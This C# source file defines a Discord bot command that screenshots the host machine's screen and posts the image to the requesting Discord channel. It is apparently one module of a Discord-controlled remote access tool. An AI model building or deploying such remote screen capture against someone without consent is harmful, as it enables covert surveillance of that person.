using Discord;
using Discord.Commands;

namespace Main.Source.Bot.Commands
{
    public class Screenshot : CommandBase
    {
        public override string Name => "ss";
        public override string Info => "Takes a screenshot of the users screen";
        public override string Use => "Scale factor (num)? | [-bypass?, -nocursor?]";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            float? scale = null;
            bool cursor = true;

            string arguments = string.Join(" ", args);

            if (args.Length > 0)
            {
                if (float.TryParse(args[0], out float parsed))
                {
                    scale = parsed;
                }
                
                if (Utilities.Parser.GetFlag(arguments, "nocursor"))
                {
                    cursor = false;
                }
            }

            if (await Functions.Screenshot.TakeScreenshot(scale, cursor) is not MemoryStream screenshot)
            {
                await socket.Message.ReplyAsync("Failed to take screenshot");
                return;
            }

            using (screenshot)
            {
                await socket.Channel.SendFileAsync(
                    stream: screenshot,
                    filename: "ss.png",
                    messageReference: new MessageReference(socket.Message.Id)
                );
            }
        }
    }
}
